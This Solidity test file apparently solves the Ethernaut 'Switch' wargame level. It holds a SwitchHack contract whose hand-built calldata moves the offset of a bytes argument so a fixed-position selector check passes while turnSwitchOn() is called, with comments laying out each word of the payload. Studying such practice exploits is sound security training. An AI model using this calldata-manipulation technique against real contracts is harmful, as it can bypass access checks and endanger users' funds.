// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "levels/Switch/Switch.sol";
import "levels/Switch/SwitchFactory.sol";
import "./utils/EthernautTest.sol";

interface ISwitch {
    function flipSwitch(bytes memory _data) external;
}

// Calldata layout ->
// 30c13ade -> function selector for flipSwitch(bytes memory data)
// 0000000000000000000000000000000000000000000000000000000000000060 -> offset for the data field
// 0000000000000000000000000000000000000000000000000000000000000000 -> empty stuff so we can have bytes4(keccak256("turnSwitchOff()")) at 64 bytes
// 20606e1500000000000000000000000000000000000000000000000000000000 -> bytes4(keccak256("turnSwitchOff()"))
// 0000000000000000000000000000000000000000000000000000000000000004 -> length of data field
// 76227e1200000000000000000000000000000000000000000000000000000000 -> functin selector for turnSwitchOnn()

contract SwitchHack {
    constructor(address _levelAddress) {
        Switch level = Switch(_levelAddress);
        bytes memory callData =
            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        address(level).call(callData);
    }
}

contract SwitchTest is Test {
    address levelAddress;
    EthernautTest ethernautTest;

    function setUp() public {
        ethernautTest = new EthernautTest();
        levelAddress = ethernautTest.setup(new SwitchFactory());
    }

    function test_Switch() external {
        // Exploit
        vm.startPrank(tx.origin);
        SwitchHack switchHack = new SwitchHack(levelAddress);
        vm.stopPrank();

        // Submit
        ethernautTest.submit();
    }
}
